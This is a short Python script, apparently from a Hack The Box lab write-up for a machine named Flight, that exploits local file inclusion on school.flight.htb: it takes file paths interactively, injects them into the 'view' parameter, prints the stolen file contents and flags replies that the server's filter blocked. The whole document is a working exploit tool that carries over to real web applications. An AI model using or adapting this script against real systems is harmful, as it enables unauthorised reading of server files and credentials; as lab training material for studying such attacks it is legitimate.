import requests
from colorama import Fore, Style

def finclusion(path):
    if '\\' in path:
        print(Fore.YELLOW + "[!] WARNING: Bad characters detected." + Style.RESET_ALL)
    
    url = f"http://school.flight.htb/index.php?view={path}"

    try:
        r = requests.get(url)
        if r.status_code != 200:
            print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
            print()
            return
        response = r.text.split('\n')
        if len(response) == 31:
            print(Fore.YELLOW + "[!] File not found." + Style.RESET_ALL)
            print()
        elif len(response) == 32 and "Suspicious Activity" in response[20]:
            print(Fore.YELLOW + "[!] Request blocked by server." + Style.RESET_ALL)
            print()
        else:
            print(Fore.GREEN + "[+] File read successful." + Style.RESET_ALL)
            print('\n'.join(response[20:-11]))
            print()
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
        print()

def main():
    while True:
        print(Fore.BLUE + "[*] File to read: (enter 'exit' to quit)" + Style.RESET_ALL)
        path = input(Fore.BLUE + ">> " + Style.RESET_ALL)
        if (path == "exit"):
            print(Fore.RED + "[-] Bye!" + Style.RESET_ALL)
            exit(0)
        finclusion(path)

if __name__ == "__main__":
    main()